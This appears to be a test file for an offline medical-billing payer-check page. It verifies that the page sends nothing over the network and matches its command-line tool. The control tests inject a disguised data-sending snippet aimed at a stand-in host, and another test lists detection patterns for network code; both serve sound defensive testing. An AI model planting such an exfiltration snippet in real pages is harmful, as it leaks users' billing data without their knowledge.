"""The page's promise: it makes no network request, and it gives the same answers as the CLI.

The page is opened straight from disk (file://), the sample remits and fee schedule are chosen through its own
file inputs, the check runs, and all three CSVs are saved through its own buttons. Every request the browser
makes is recorded. Anything other than the page itself (and the blob: URLs its save buttons create on this
computer) fails the build. The browser stays open for a few seconds after the last save, so a request the
page sends a moment later is still caught, and the page may not open a second window or tab. Two control runs
plant an outside request in a copy of the page (one at load, one half a second after a save) and check the
recorder catches each, so a pass can't come from a recorder that sees nothing.
"""
import re, subprocess, sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
PAGE = ROOT / 'payer-check.html'
SAMPLE = ROOT / 'sample-data'
OUTPUTS = ('summary-by-payer.csv', 'summary-by-payer-and-code.csv', 'chart-pull-list.csv')
SETTLE_MS = 3000          # how long the browser stays open after the last save, to catch anything sent late

sync_api = pytest.importorskip('playwright.sync_api')


@pytest.fixture(scope='module')
def browser():
    with sync_api.sync_playwright() as p:
        try:
            b = p.chromium.launch()
        except Exception:                      # no bundled Chromium on this machine: use installed Chrome
            b = p.chromium.launch(channel='chrome')
        yield b
        b.close()


def open_page(browser, url):
    """A fresh context that records every request and aborts any that would leave this computer."""
    ctx = browser.new_context(accept_downloads=True, service_workers='block')
    log = []
    ctx.on('request', lambda r: log.append(r.url))
    ctx.route(re.compile(r'^(https?|wss?|ftp)://'), lambda route: route.abort())
    ctx.on('page', lambda p: log.append('new window or tab: ' + p.url))
    page = ctx.new_page()
    log.clear()                           # the test's own first tab isn't the page's doing
    page.goto(url)
    return ctx, page, log


def outside(log, url):
    return [u for u in log if u != url and not u.startswith(('blob:', 'data:'))]


def run_and_save(page, folder):
    """Choose the sample, run the check, save all three CSVs through the page's buttons, then wait."""
    page.set_input_files('#remit-folder', str(SAMPLE / '835'))
    page.set_input_files('#fee-file', str(SAMPLE / 'fee-schedule.csv'))
    page.click('#run')
    page.wait_for_selector('#results:not([hidden])', timeout=60000)
    saved = {}
    for name in OUTPUTS:
        with page.expect_download() as d:
            page.click(f'[data-out="{name}"]')
        d.value.save_as(folder / name)
        saved[name] = (folder / name).read_bytes()
    page.wait_for_timeout(SETTLE_MS)
    return saved


def test_no_network_requests(browser, tmp_path):
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    saved = run_and_save(page, tmp_path / 'page')
    assert page.is_visible('#sample-banner'), 'sample runs carry the Sample data label'
    windows = len(ctx.pages)
    ctx.close()

    bad = outside(log, url)
    print(f'\nRequests recorded during a full run and {SETTLE_MS / 1000:g} s after the last save: {len(log)} '
          f'(the page itself: {log.count(url)}). Files saved on this computer: {len(saved)}. Windows or tabs open: {windows}')
    print(f'Network requests: {len(bad)}')
    assert windows == 1, 'the page opened another window or tab'
    assert bad == [], f'the page made network requests: {bad}'

    # Same answers as the CLI, byte for byte
    subprocess.run([sys.executable, str(ROOT / 'payer_check.py'), str(SAMPLE / '835'), str(SAMPLE / 'fee-schedule.csv'),
                    '--out', str(tmp_path / 'cli')], check=True, capture_output=True)
    for name in OUTPUTS:
        assert saved[name] == (tmp_path / 'cli' / name).read_bytes(), f'{name}: the page and the CLI disagree'
    print('Page CSVs identical to CLI CSVs: ' + ', '.join(f'{n} ({len(saved[n]):,} bytes)' for n in OUTPUTS))


DEMOS = sorted((ROOT / 'demos').glob('*.html'))


@pytest.mark.parametrize('demo', DEMOS, ids=[d.name for d in DEMOS])
def test_demo_pages_make_no_network_requests(browser, demo):
    """The demo pages under demos/ carry the same policy and make no request either, with every visible button pressed."""
    src = demo.read_text()
    assert "default-src 'none'" in src and "connect-src 'none'" in src, f'{demo.name} carries the same CSP as the page'
    url = demo.as_uri()
    ctx, page, log = open_page(browser, url)
    pressed = 0
    for b in page.query_selector_all('button')[:40]:
        try:
            if b.is_visible():
                b.click(timeout=500)
                pressed += 1
        except Exception:                      # a button hidden or replaced by an earlier press
            pass
    page.wait_for_timeout(SETTLE_MS)
    windows = len(ctx.pages)
    ctx.close()

    bad = outside(log, url)
    print(f'\n{demo.name}: {pressed} buttons pressed, {len(log)} requests recorded (the page itself: {log.count(url)}), '
          f'network requests: {len(bad)}, windows or tabs open: {windows}')
    assert pressed > 0, f'{demo.name}: no button was pressed'
    assert windows == 1, f'{demo.name} opened another window or tab'
    assert bad == [], f'{demo.name} made network requests: {bad}'


def test_recorder_catches_a_request(browser, tmp_path):
    """Control: a copy of the page with its security policy removed and one outside image planted."""
    html = PAGE.read_text()
    html = re.sub(r'<meta http-equiv="Content-Security-Policy"[^>]*>', '', html)
    html = html.replace('<main>', '<main><img alt="" src="https://payer-check.invalid/planted.png">', 1)
    copy = tmp_path / 'planted.html'
    copy.write_text(html)
    ctx, page, log = open_page(browser, copy.as_uri())
    page.wait_for_timeout(500)
    ctx.close()
    assert outside(log, copy.as_uri()) == ['https://payer-check.invalid/planted.png']


@pytest.mark.parametrize('how', ['location.href = u', 'window.open(u)'])
def test_recorder_catches_a_late_request(browser, tmp_path, how):
    """Control: a copy of the page, security policy kept, that sends data away half a second after a save,
    by navigating the tab or opening a new one (the policy doesn't govern either, so the test has to)."""
    html = PAGE.read_text().replace(
        'setTimeout(function () { URL.revokeObjectURL(url); }, 1000);',
        "setTimeout(function () { URL.revokeObjectURL(url); }, 1000); setTimeout(function () { var u = ['ht', 'tps:', '//payer-check.invalid/?d='].join('') "
        "+ encodeURIComponent(outputs[name].slice(0, 200)); " + how + "; }, 500);", 1)
    assert 'payer-check.invalid' in html
    copy = tmp_path / 'late.html'
    copy.write_text(html)
    ctx, page, log = open_page(browser, copy.as_uri())
    run_and_save(page, tmp_path / 'out')
    ctx.close()
    assert any('payer-check.invalid' in u for u in outside(log, copy.as_uri())), log


def test_policy_blocks_connections(browser):
    """The page's own security policy refuses a connection even if code tried one."""
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    outcome = page.evaluate("fetch('https://payer-check.invalid/x').then(() => 'sent', e => 'refused: ' + e.name)")
    ctx.close()
    assert outcome.startswith('refused')
    assert outside(log, url) == [], 'the browser never even attempted it'


def test_source_has_no_network_code():
    """A plain read of the file: nothing that loads or sends anything."""
    src = PAGE.read_text()
    for pat in (r'https?://', r'\bfetch\s*\(', r'XMLHttpRequest', r'WebSocket', r'EventSource', r'sendBeacon', r'importScripts',
                r'<script[^>]+src=', r'<link\b', r'@import', r'(?<![\w.])url\(', r'<iframe', r'<form\b', r'navigator\.serviceWorker'):
        assert not re.search(pat, src, re.I), pat
    assert "connect-src 'none'" in src and "default-src 'none'" in src


def fixture_files():
    """A small made-up 835 set that exercises what the sample doesn't: other separators, no REF*6R line numbers,
    a reversal with no line control numbers, a missing received date, a second ST in one file, a payer with no
    fee schedule rows, an orphan reversal, a quoted CSV with Windows line ends and a blank effective date. Sample data."""
    isa = 'ISA|00|          |00|          |ZZ|SAMPLESENDER   |ZZ|SAMPLEGRP      |260101|1200|^|00501|000000001|0|T|>~'
    assert len(isa) == 106
    a = '\n'.join([isa, 'GS|HP|X|Y|20260101|1200|1|X|005010X221A1~',
        'ST|835|0001~', 'BPR|I|100|C|ACH||||||||||||20260210~', 'TRN|1|SAMPLE1|1~', 'N1|PR|sample plan x ~',
        'CLP|SX1|1|300|80|20|12|1~', 'NM1|QC|1|SAMPLE|PATIENT~', 'NM1|82|1|DOE|SAM~', 'DTM|050|20260115~',
        'SVC|HC>99214|300|80||1|HC>99215~', 'DTM|472|20260110~', 'CAS|CO|45|200~', 'CAS|PR|3|20~', 'AMT|B6|100~',
        'SVC|HC>81000|20|0~', 'DTM|472|20260110~', 'CAS|CO|97|20~',
        'CLP|SX2|1|200|90|0|12|1~', 'NM1|82|1|DOE|SAM~', 'DTM|232|20260111~',
        'SVC|HC>99213|200|90~', 'CAS|CO|45|110~', 'LQ|HE|N130~',
        'SE|20|0001~',
        'ST|835|0002~', 'BPR|I|0|C|ACH||||||||||||~', 'DTM|405|20260301~', 'N1|PR|SAMPLE PLAN X~',
        'CLP|SX2|22|-200|-90|0|12|1~', 'NM1|82|1|DOE|SAM~', 'DTM|232|20260111~', 'SVC|HC>99213|-200|-90~', 'CAS|CO|45|-110~',
        'CLP|SX2|1|200|90|0|12|1~', 'NM1|82|1|DOE|SAM~', 'DTM|232|20260111~', 'SVC|HC>99213|200|90~', 'CAS|CO|45|110~',
        'CLP|OLD9|22|-50|-50|0|12|1~', 'SVC|HC>99212|-50|-50~', 'DTM|472|20251201~',
        'SE|12|0002~', 'GE|2|1~', 'IEA|1|000000001~'])
    b = a.replace('SAMPLE PLAN X', 'SAMPLE PLAN Y').replace('sample plan x ', 'SAMPLE PLAN Y')
    fees = 'payer,cpt,description,contracted_allowed,effective\r\nSAMPLE PLAN X,99215,"Visit, level 5",150.00,\r\n' \
           'Sample Plan X,99213,"Visit, ""level 3""",95.005,2026-01-01\r\nSAMPLE PLAN X,99213,old,80,2025-01-01\r\n\r\n'
    return [('a.835', a), ('sub/b.835', b)], fees


def test_page_matches_cli_on_edge_cases(browser):
    sys.path.insert(0, str(ROOT))
    import payer_check as pc
    files, fees = fixture_files()
    py = pc.run(files, fees, dict(hourly='45.5', writeoff_pct='12.5', slow_days=20))
    assert py['raw_lines'] == 12 and py['payers_without_fees'] == ['SAMPLE PLAN Y']
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    js = page.evaluate("""([files, fees]) => { const r = window.payerCheck.run(files, fees, {hourly: '45.5', writeoff_pct: '12.5', slow_days: 20});
        return ['by_payer', 'by_code', 'pull'].map(k => window.payerCheck.toCsv(r[k], r.sample)); }""", [files, fees])
    ctx.close()
    for k, got in zip(('by_payer', 'by_code', 'pull'), js):
        assert got == pc.to_csv(py[k], py['sample']), k
    assert outside(log, url) == []


def test_example_matches_the_cli_on_the_sample():
    """The worked example near the top of the page is the sample run, row for row, and says Sample data."""
    import csv, io
    src = PAGE.read_text()
    shown = dict(re.findall(r'<tr data-payer="([^"]+)" data-cost="([^"]+)">', src))
    assert shown, 'the page carries the worked example'
    assert 'Sample data' in src[src.index('id="example"') - 400:src.index('id="example"')]
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        subprocess.run([sys.executable, str(ROOT / 'payer_check.py'), str(SAMPLE / '835'), str(SAMPLE / 'fee-schedule.csv'),
                        '--out', d], check=True, capture_output=True)
        rows = {r['payer']: r for r in csv.DictReader(io.StringIO((Path(d) / 'summary-by-payer.csv').read_text()))}
    for payer, cost in shown.items():
        assert rows[payer]['cost_per_100_paid'] == cost, payer
        paid = '$' + format(round(float(rows[payer]['paid'])), ',')
        assert re.search(r'data-payer="' + re.escape(payer) + r'"[^\n]*<td>' + re.escape(paid) + '</td>', src), (payer, paid)
    print(f'\nWorked example matches the CLI sample run for {len(shown)} payers: ' + ', '.join(f'{p} ${c}' for p, c in shown.items()))


def test_rates_template_downloads_offline_and_reads(browser, tmp_path):
    """The template button saves a CSV on this computer, sends nothing, and the template reads as a fee schedule."""
    url = PAGE.as_uri()
    ctx, page, log = open_page(browser, url)
    with page.expect_download() as d:
        page.click('#fee-template')
    d.value.save_as(tmp_path / 'template.csv')
    page.wait_for_timeout(SETTLE_MS)
    windows = len(ctx.pages)
    ctx.close()
    assert windows == 1 and outside(log, url) == []
    text = (tmp_path / 'template.csv').read_text()
    assert text.splitlines()[0] == 'payer,cpt,description,contracted_allowed,effective'
    sys.path.insert(0, str(ROOT))
    import payer_check as pc
    files, _ = fixture_files()
    pc.run(files, text, dict(hourly='30', writeoff_pct='46', slow_days=30))
    print(f'\nTemplate saved on this computer ({len(text)} bytes), network requests: 0, windows or tabs open: {windows}')
